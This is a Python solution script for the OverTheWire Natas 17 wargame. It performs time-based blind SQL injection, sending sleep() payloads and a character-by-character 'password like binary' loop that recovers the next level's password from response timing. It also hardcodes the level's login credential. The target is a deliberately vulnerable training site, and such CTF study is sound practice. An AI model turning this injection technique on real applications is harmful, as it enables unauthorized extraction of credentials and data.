import requests
import bs4
import re
import string


# configuration for natas17
USERNAME = 'natas17'
PASSWORD = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
URL = 'http://natas17.natas.labs.overthewire.org/'
AUTH = requests.auth.HTTPBasicAuth(USERNAME, PASSWORD)


session = requests.Session()
session.auth = AUTH
# get the challenge content
response = session.get(URL)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')


# get the source code
response = session.get(URL + 'index-source.html')
# print(response.text)


# as we can see in the source, the feedback to the user is now commented out
"""
if(mysql_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }
"""
# one attack that we can try is time-based SQL injection attack
# the idea is that if the user exists, then the website will return its response 
# after X seconds
# otherwise, the website will response immediately
# for example,
# reference: https://stackoverflow.com/questions/43252542/how-to-measure-server-response-time-for-python-requests-post-request
data = {
    "username" : "randomuserthatdoesntexist\" and sleep(10) # A ",
    "submit" : "submit"
}
response = session.post(URL, data=data)
print(f"example 1: time elapsed = {response.elapsed.total_seconds()}s")

data = {
    "username" : "natas18\" and sleep(10) # A ",
    "submit" : "submit"
}
response = session.post(URL, data=data)
print(f"example 2: time elapsed = {response.elapsed.total_seconds()}s")
print('\n')
# as we can see, the first request returned almost immediately as the user doesn't exist in the database
# the second request, however, returned after 10 seconds, which is the sleep time that we set in the sleep() function


# STEP 1: get the possible characters in the password
SLEEP_SECONDS = 3
possible_chars = string.ascii_letters + string.digits
password_chars = ""
for char in possible_chars:
    print(f"password_chars: {password_chars + char}", end='\r')
    data = {
        "username" : f'natas18" and password like binary "%{char}%" and sleep({SLEEP_SECONDS}) # A ',
        "submit" : 'submit'
    }
    response = session.post(URL, data=data)
    # if the response time exceeded the sleep time, then the character is in the password
    if response.elapsed.total_seconds() > SLEEP_SECONDS:
        password_chars += char
        print(f'password_chars: {password_chars}', end='\r')
print('\n')